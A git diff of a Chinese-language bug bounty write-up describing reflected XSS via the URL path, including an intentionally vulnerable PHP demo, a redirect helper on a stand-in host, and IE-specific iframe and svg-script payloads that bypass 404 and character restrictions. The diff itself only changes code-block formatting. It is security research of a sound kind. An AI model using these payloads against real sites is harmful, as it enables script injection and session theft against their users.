@@ -4,14 +4,13 @@ title: bug bounty writeup - xss in url path
 categories: articles
 ---
 
-<h1 align="center">{{ page.title }}</h1>
 <p align="right" class="date">{{ page.date | date_to_string }} - L3m0n</p>
 
 漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/
 
 Demo Code:
 
-```
+{% highlight php %}
 <?php
 header('HTTP/1.1 404 Not Found');
 $path = trim($_SERVER['PATH_INFO'],"/");
@@ -20,7 +19,7 @@ $action_name = substr($path, $limit_pos);
 $controller_name = str_replace("/","\\",substr($path, 0, $limit_pos));
 echo "Action: " . $action_name . " has controller: \\" . $controller_name;
 ?>
-```
+{% endhighlight %}
 
 ## 404头的问题
 
@@ -40,14 +39,14 @@ echo "Action: " . $action_name . " has controller: \\" . $controller_name;
 
 但是在IE下，使用3xx跳转后可以绕过
 
-```
+{% highlight php %}
 <?php
 header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,302);
-```
+{% endhighlight %}
 
-```
+{% highlight php %}
 http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=<>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<>
-```
+{% endhighlight %}
 
 <img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg">
 
@@ -59,37 +58,37 @@ http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=<>aaaaaaaaaaa
 
 IE edge / 11下这样利用
 
-```
+{% highlight javascript %}
 <iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
-```
+{% endhighlight %}
 
 所以换到目标，则payload为如下:
 
-```
+{% highlight javascript %}
 <iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe>" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=1 onerror=alert(1)>'"></iframe>
-```
+{% endhighlight %}
 
 <img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg">
 
 但是又被一些坑点限制了:
 
-```
+{% highlight javascript %}
 无空格(会被url->%20)
 无/(会被转换为\)
-```
+{% endhighlight %}
 
 ## bypass限制
 通过下面的payload可绕过
 
-```
+{% highlight javascript %}
 <svg><script>alert(document.domain)<b>
-```
+{% endhighlight %}
 
 最终payload:
 
-```
+{% highlight javascript %}
 <iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe>" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg><script>alert(document.domain)<b>'"></iframe>
-```
+{% endhighlight %}
 
 <img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg">
 
